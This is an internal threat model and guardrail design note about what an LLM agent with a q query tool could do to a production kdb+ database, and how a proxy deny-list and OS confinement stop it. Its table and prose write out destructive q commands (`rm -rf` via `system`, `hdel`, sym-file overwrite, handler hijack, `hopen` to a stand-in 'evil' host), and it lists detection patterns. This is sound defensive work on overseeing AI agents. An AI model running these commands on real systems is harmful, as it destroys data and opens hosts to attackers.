# kdb+ system-command & dangerous-builtin threat model + guardrail

*2026-06-14, homer. What an LLM agent with a q query tool can do to a production
kdb+ estate beyond `select`/`delete`, the damage, the guardrail Aegis now applies,
and how it is tested. Prompted by: "serious controls around system command usage
in kdb when an LLM is deployed."*

## The surface (why `select`/`update` rejection is not enough)

q is a full programming language reached through the same channel as a query. A
single string sent to a kdb+ process can call OS, file, network and process
builtins. The QueryGuard proxy enumerated goodness on *structure* (a read on an
allowlisted table) but did **not** inspect the select *body* — so a structurally
valid read could carry an arbitrary side effect.

**Proven on the live FSP gateway (before the fix):**
`select sh:system "id" from trade where date=2015.01.08` was accepted (rewrite)
and **executed shell on the kdb host**, returning `uid=1064(jtoffolo) ...`. Swap
`id` for `rm -rf /data/hdb` or `kill -9 <tickerplant>` and that is a production
incident.

### Dangerous constructs and their prod blast radius

| construct | example | damage in prod |
|---|---|---|
| `system` (shell) | `system "rm -rf /data/hdb"`, `system "kill -9 <pid>"`, `system "chmod 000 ..."` | delete/corrupt HDB partitions; kill the tickerplant (market-data capture gap — regulatory); break file perms so processes can't read/write |
| `hdel` | `hdel \`:/data/hdb/2025.06.13` | delete partition directories → permanent data loss (HDB has no replay log) |
| `set` / `save` / `0:`/`1:` | `\`:/data/hdb/sym set ...` | overwrite the **sym file** → every enumerated symbol column across the *entire* HDB becomes garbage; usually unrecoverable |
| `2:` | `\`:lib 2:(\`f;1)` | load an arbitrary shared object → native code execution |
| `hopen` | `hopen \`:evil:9999` | outbound connection → exfiltration / lateral movement to other kdb processes |
| `value`/`eval`/`parse`/`get` | `value "system \"...\""` | dynamic eval that defeats static analysis; `get` reads arbitrary files |
| `.z.pg:{...}` (handler assign) | `.z.pg:{system x}` | hijack the message handler — every future query runs attacker code; or DoS |
| persistent mutation | `update price:0 from \`trade`, `delete from \`trade`, `insert[\`trade;..]` | corrupt the live in-memory/persisted table (backtick = in-place) |
| `exit` / `\\` | `exit 0` | kill the process |

Note: leading `\` system commands (`\l`, `\cd`, `\t`) and bare assignments are
naturally excluded because the proxy requires a query that *starts* with
`select`/`exec`; the risks above are the ones that hide *inside* a valid select.

## The guardrail

**Layer 1 — QueryGuard proxy (ground truth on the DB-bound query).** A
dangerous-construct veto (`_DANGEROUS_Q`) runs in `analyze()` before any select is
accepted and rejects, fail-closed, if the comment-stripped body matches any of:
`system`, `getenv/setenv`, `hopen/hclose`, `hdel`, `set`/`save`/`rsave`/`dsave`/
`hsym`/`read0`/`read1`/`[012]:`, `value`/`eval`/`parse`/`get`, a `.z.<cb>:` handler
assignment or `exit`, `.[`/`@[` amend, and persistent (backtick-targeted) mutation.
Precision: plain `.z.d`/`.z.p` date-time reads and *functional* `update … from <t>`
(no backtick) are **not** flagged — verified against the 52-query benign corpus (0
deny-scan false positives) and unit tests.

**Layer 2 — gate detector `kdb_guard` (defense-in-depth + audit).** Mirrors the
same deny-list at the engine, scoped to configured query tools
(`run_query`/`run_q`/`qcmd`/…) so the q-specific list never false-positives on a
Bash `--get`/`set` token. Emits `KDB-Q-*` block findings for the audit trail and
covers any tool that carries q, not just the proxied `run_query`.

**Still load-bearing underneath:** OS confinement (read-only rootfs, dropped caps,
empty netns) and the egress proxy — a bypass of the gate is contained because the
process physically cannot delete files, open sockets, or reach prod. Proven on
homer: `confine_adversarial_test` 7/7, `landlock_test` 6/6.

## Tests (demonstrating the guardrail works)

- `aegis/query_proxy_test.py` — 10 new attack cases (embedded `system`, `hdel`,
  `hopen`, `value`, `exec system`, `set`, `.z.pg` hijack, `save`, backtick-persist
  `update`, `2:` dynload) all **reject**; plus two precision cases (`.z.d` read and
  functional `update` **not** over-blocked). Part of `run_all_checks` (23/23).
- Real-q proof: `select system "id" from trade where date=…` → *"QUERY REJECTED BY
  PROXY [Q-SYSTEM-EXEC]"* — never reaches the gateway; a legitimate aggregation on
  the same gateway still returns rows.
- Gate proof: the same attacks fed to `engine.evaluate` block with `KDB-Q-*` rules.

## Separate finding surfaced by the widened corpus (not this fix)

The proxy accepts only a query that *starts* with `select`/`exec` over a simple
`from <table>`. Real desk idioms — `aj[…]`/`wj[…]` joins, `meta`, `N#select` /
`expr xdesc select` row-limiting, `count distinct exec`, set operations, nested
`from (…)` — are therefore **rejected as unrecognised**. These are legitimate
reads, so this is a *coverage* gap (usability FP), not a security hole (fail-closed
is safe). Widening safe parse coverage without enlarging the attack surface is its
own work item — flagged for review, not addressed here.
